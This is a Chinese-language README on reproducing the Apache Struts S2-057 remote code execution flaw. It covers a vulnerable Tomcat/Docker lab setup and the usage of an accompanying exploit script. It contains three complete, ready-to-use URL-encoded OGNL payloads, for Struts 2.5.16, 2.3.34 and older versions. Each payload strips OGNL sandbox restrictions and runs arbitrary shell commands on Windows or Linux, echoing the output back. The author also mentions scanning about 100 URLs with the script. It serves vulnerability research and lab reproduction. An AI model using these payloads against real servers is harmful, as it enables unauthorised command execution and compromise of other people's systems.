# S2-057本地测试与复现

FN@悬镜安全实验室

## POC

测试发现结合S2-045构造的POC堪称完美，linux和windows通用，应该可执行任意命令，返回格式舒服且无乱码，当然是根据各位大佬的poc自行测试构造的

- struts 2.5.16：

第一次poc请求会500，然后再次请求命令执行成功，原因未知，猜测是setExcluded*的问题

```
%24%7B%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.setExcludedClasses%28%27java.lang.Shutdown%27%29%29.%28%23ou.setExcludedPackageNames%28%27sun.reflect.%27%29%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
```

- struts 2.3.34：

本地测试发现下面poc中的(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear())去掉也能执行成功

```
%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
```

- struts 2.3.20、struts 2.2.3.1等：

```
%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
```

注意：/不能编码为%2f，这个坑了好久，tomcat的原因

## 漏洞环境

war包：

https://archive.apache.org/dist/struts/2.5.16/struts-2.5.16-all.zip

https://archive.apache.org/dist/struts/2.3.34/struts-2.3.34-all.zip

https://archive.apache.org/dist/struts/2.3.20/struts-2.3.20-all.zip

http://archive.apache.org/dist/struts/binaries/struts-2.2.3.1-all.zip

其中的struts2-showcase.war，当然这里提供了部分war包

- windows

tomcat+war即可

修改对应的\WEB-INF\classes\struts-actionchaining.xml

原：

```
<struts>
	<package name="actionchaining" extends="struts-default" namespace="/actionchaining">
		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
			<result type="chain">actionChain2</result>		
		</action>
		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
			<result type="chain">actionChain3</result>
		</action>
		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
			<result>/WEB-INF/actionchaining/actionChainingResult.jsp</result>
		</action>
	</package>
</struts>
```

修改为：

```
<struts>
	<package name="actionchaining" extends="struts-default">
		<action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1">
			<result type="redirectAction">
				<param name = "actionName">register2</param>
			</result>
		</action>
		<action name="actionChain2" class="org.apache.struts2.showcase.actionchaining.ActionChain2">
			<result type="chain">xxx</result>
		</action>
		<action name="actionChain3" class="org.apache.struts2.showcase.actionchaining.ActionChain3">
			<result type="postback">
				<param name = "actionName">register2</param>
			</result>
		</action>
	</package>
</struts>
```

访问：

http://localhost:8080/S2-057-2-5-16/${(111+111)}/actionChain1.action

http://localhost:8080/S2-057-2-3-34/${(111+111)}/actionChain1.action

跳转并计算表达式，漏洞环境搭建成功

- linux

直接使用p牛的vulhub：https://github.com/vulhub/vulhub/tree/master/struts2/s2-057

或者根据需要修改配置，比如：

https://github.com/vulhub/vulhub/tree/master/struts2/s2-015

需要修改Dockerfile和拷贝相应war文件和xml文件

```
COPY S2-057-2-3-34.war /usr/local/tomcat/webapps/S2-057-2-3-34.war
COPY S2-057-2-5-16.war /usr/local/tomcat/webapps/S2-057-2-5-16.war
COPY vul.xml /usr/local/tomcat/webapps/struts-actionchaining.xml
```

启动：docker-compose up -d

然后需要进入docker

docker ps

docker exec -i -t [CONTAINER_ID] /bin/bash

docker内执行：

```
cd /usr/local/tomcat/webapps
cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/classes/struts-actionchaining.xml
#cp struts-actionchaining.xml S2-057-2-3-34/WEB-INF/src/java/struts-actionchaining.xml
cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/classes/struts-actionchaining.xml
#cp struts-actionchaining.xml S2-057-2-5-16/WEB-INF/src/java/struts-actionchaining.xml
cd /usr/local/tomcat/bin
./shutdown.sh
```

会自动退出docker，然后再次docker-compose up -d，不能docker-compose down，不然得重新进入docker配置

访问

http://IP:8080/S2-057-2-3-34/$%7B(111+111)%7D/actionChain1.action

http://IP:8080/S2-057-2-5-16/$%7B(111+111)%7D/actionChain1.action

跳转并计算表达式说明搭建成功

注意：

如果需要重新创建容器，需要先删除相应的镜像

docker images

docker rmi image_id


## 漏洞复现

只提供了windows下的部分截图

1.Redirect action

http://HOST/S2-057-2-3-34/POC/actionChain1.action

表达式验证在返回头Location里，poc命令执行回显在body里

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Redirect-dir.jpg)

2.Chain action

http://HOST/S2-057-2-3-34/POC/actionChain2.action

无回显，无跳转，应该是xml中该action配置的原因，命令执行成功，回显在body里

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Chain-dir.jpg)

3.Postback action

http://HOST/S2-057-2-3-34/POC/actionChain3.action

验证和回显都在body，form的形式

![image](https://github.com/Fnzer0/S2-057-poc/blob/master/Postback-echo.jpg)

## 检测脚本

写的不是很好，将就用吧，有bug自行修改，参考了https://github.com/mazen160/struts-pwn_CVE-2018-11776

建议检测的话两种方式都检测

1.表达式检测

python S2-057-exp.py -u http://localhost:8080/S2-057-2-3-34/actionChain1.action

2.命令执行检测

python S2-057-exp.py -u http://localhost:8080/S2-057-2-3-34/actionChain1.action --exp

确定了注入点和POC的话可以使用下面的参数配合使用（源码只检测了最后一个注入点，见源码注释）

python S2-057-exp.py -i http://localhost:8080/S2-057-2-3-34/{{INJECTION_POINT}}/actionChain1.action -p S2-057-2 -c ipconfig --exp

更多帮助参考python S2-057-exp.py -h

实际测试检测了差不多100个URL，没一个存在的，估计利用条件是真的难，不想再研究了

## 参考

[S2-057 远程命令执行漏洞复现](https://mp.weixin.qq.com/s/H6bLuXS8qCVRh1mSgAkdXQ)

[S2-057技术分析](https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&mid=2247483698&idx=1&sn=1b79bb4bd7d5b1173043d0c5c8335320)

[【Struts2-代码执行漏洞分析系列】S2-057](https://xz.aliyun.com/t/2618)

[Struts2-057/CVE-2018-11776两个版本RCE漏洞分析（含EXP）](https://www.anquanke.com/post/id/157823)

[S2-057 漏洞环境搭建及EXP构造(Struts2 2.5.16)](https://otakekumi.github.io/2018/08/25/S2-057-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/)

https://github.com/jas502n/St2-057

https://lgtm.com/blog/apache_struts_CVE-2018-11776
